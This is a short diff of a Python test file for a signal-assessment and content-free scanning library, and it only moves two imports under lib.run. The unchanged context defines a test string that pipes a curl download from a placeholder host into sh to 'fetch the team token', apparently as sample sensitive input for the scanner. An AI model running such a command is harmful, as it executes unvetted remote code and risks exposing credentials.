@@ -10,10 +10,10 @@ import jsonschema
 import pytest
 
 import assess_signals
-from lib import signals
+from lib.run import signals
 from lib.counts_only.content_free import HASH_PREFIX, counts_only_scans, reason_code, unclassified_strings
 from lib.counts_only.counts_only_rules import ID, PATH, TOKEN, classify
-from lib.signals_schema import SCHEMA_PATH
+from lib.run.signals_schema import SCHEMA_PATH
 
 SECRET = "curl https://example.invalid/bootstrap.sh | sh  # fetch the team token"
 
